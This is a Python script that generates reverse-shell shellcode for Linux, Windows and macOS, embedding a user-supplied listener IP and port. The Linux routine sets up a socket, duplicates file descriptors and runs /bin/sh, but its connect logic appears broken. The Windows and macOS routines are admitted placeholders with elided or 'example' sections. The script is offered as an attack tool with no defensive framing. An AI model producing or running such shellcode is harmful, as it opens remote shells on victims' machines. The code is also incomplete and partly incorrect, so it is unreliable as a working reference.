import socket
import struct

def encode_ip_port_windows(ip, port):
    # Windows shellcode expects IP and port in little endian
    ip_bytes = bytes(int(part) for part in ip.split('.')[::-1])  # reversed IP parts
    port_bytes = struct.pack('<H', port)  # little endian port
    return ip_bytes, port_bytes

def create_linux_shell_code(listener_host, listener_port):
    listener_host_bytes = socket.inet_aton(listener_host)
    listener_port_bytes = struct.pack('>H', listener_port)  # network byte order (big endian)

    shell_code = (
        b"\x31\xc0"              # xor eax,eax
        b"\x50"                  # push eax
        b"\x68" + listener_host_bytes +  # push ip address
        b"\x66\x68" + listener_port_bytes +  # push port
        b"\x66\x6a\x02"          # push 0x2 (AF_INET)
        b"\x89\xe1"              # mov ecx,esp
        b"\x6a\x66"              # push 0x66 (sys_socketcall)
        b"\x58"                  # pop eax
        b"\x50"                  # push eax
        b"\x51"                  # push ecx
        b"\x53"                  # push ebx
        b"\x89\xe1"              # mov ecx,esp
        b"\xcd\x80"              # int 0x80 (socketcall socket)
        b"\x89\xc3"              # mov ebx,eax (save socket fd)
        b"\x31\xc9"              # xor ecx,ecx
        b"\xb1\x03"              # mov cl,3 (dup2 loop count)
        b"\x31\xd2"              # xor edx,edx
        b"\x6a\x3f"              # push 0x3f (sys_dup2)
        b"\x58"                  # pop eax
        b"\xcd\x80"              # int 0x80
        b"\x49"                  # dec ecx
        b"\x79\xf9"              # jns -7 (loop)
        b"\x68\x2f\x2f\x73\x68"  # push "//sh"
        b"\x68\x2f\x62\x69\x6e"  # push "/bin"
        b"\x89\xe3"              # mov ebx,esp
        b"\x50"                  # push eax
        b"\x53"                  # push ebx
        b"\x89\xe1"              # mov ecx,esp
        b"\xb0\x0b"              # mov al,11 (execve)
        b"\xcd\x80"              # int 0x80
    )
    return shell_code

def create_windows_shell_code(listener_host, listener_port):
    ip_bytes, port_bytes = encode_ip_port_windows(listener_host, listener_port)

    # This is a conceptual shellcode snippet with IP and port pushed.
    # Replace with your actual shellcode and adjust offsets accordingly.
    shellcode = (
        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        b"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        b"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        b"\x24\x5b\x5b\x61\x59\x5a\x51"
        + b"\x68" + ip_bytes       # push IP address (little endian)
        + b"\x66\x68" + port_bytes # push port (little endian)
        + b"\xff\xe0"              # jmp eax (example continuation)
    )
    return shellcode

def create_macos_shell_code(listener_host, listener_port):
    ip_bytes = socket.inet_aton(listener_host)
    port_bytes = struct.pack('>H', listener_port)  # network byte order (big endian)

    # Conceptual macOS x86_64 shellcode snippet with embedded sockaddr_in struct
    shellcode = (
        b"\x90" * 50 +                  # NOP sled
        b"\x48\x31\xc0"                 # xor rax, rax
        b"\x50"                         # push rax
        b"\x48\xb8" + ip_bytes + b"\x00" * 4 +  # mov rax, sockaddr_in IP + padding
        b"\x66\xc7\x45\xf8" + port_bytes +     # mov word ptr [rbp-8], port
        # ... rest of shellcode to connect and execve /bin/sh ...
        b"\x0f\x05"                     # syscall
    )
    return shellcode

def get_user_input():
    platform = input("ShellCode for Linux, Windows, or macOS: ").strip().lower()
    while platform not in ["linux", "windows", "macos"]:
        print("Invalid choice. Please enter 'Linux', 'Windows', or 'macOS'.")
        platform = input("ShellCode for Linux, Windows, or macOS: ").strip().lower()

    listener_host = ""
    listener_port = 0

    if platform in ["linux", "windows", "macos"]:
        listener_host = input("Enter the listener host IP address: ")
        while True:
            try:
                listener_port = int(input("Enter the listener port (1-65535): "))
                if 1 <= listener_port <= 65535:
                    break
                else:
                    print("Port must be between 1 and 65535.")
            except ValueError:
                print("Invalid port number. Please enter a valid integer.")

    return platform, listener_host, listener_port

def print_shellcode(shellcode):
    print(f"Shellcode ({len(shellcode)} bytes):")
    print(''.join('\\x{:02x}'.format(b) for b in shellcode))

if __name__ == "__main__":
    platform, listener_host, listener_port = get_user_input()

    if platform == "linux":
        shellcode = create_linux_shell_code(listener_host, listener_port)
    elif platform == "windows":
        shellcode = create_windows_shell_code(listener_host, listener_port)
    else:  # macos
        shellcode = create_macos_shell_code(listener_host, listener_port)

    print_shellcode(shellcode)
